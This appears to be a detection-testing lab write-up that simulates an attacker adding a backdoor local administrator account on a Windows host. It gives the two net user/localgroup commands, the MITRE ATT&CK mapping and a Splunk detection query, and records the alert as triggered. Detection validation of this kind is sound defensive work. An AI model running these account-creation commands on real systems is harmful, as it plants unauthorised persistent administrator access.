# Attack Simulation 7: New Admin Account Creation (Windows)

## Objective
Simulate an attacker creating a backdoor administrator account
on the Windows endpoint.

## Attack Machine
Windows Host PC (post-compromise, internal)

## Attack Commands
```powershell
net user hacker P@ssw0rd123! /add
net localgroup administrators hacker /add
```

## MITRE ATT&CK Mapping
- Technique: T1136.001 - Create Account: Local Account
- Tactic: Persistence

## Detection Rule Triggered
- Alert: New Admin Account Created
- SPL: index=windows_logs (EventCode=4720 OR EventCode=4732)
- Status: TRIGGERED

## Result
CONFIRMED - Account creation and privilege group addition detected
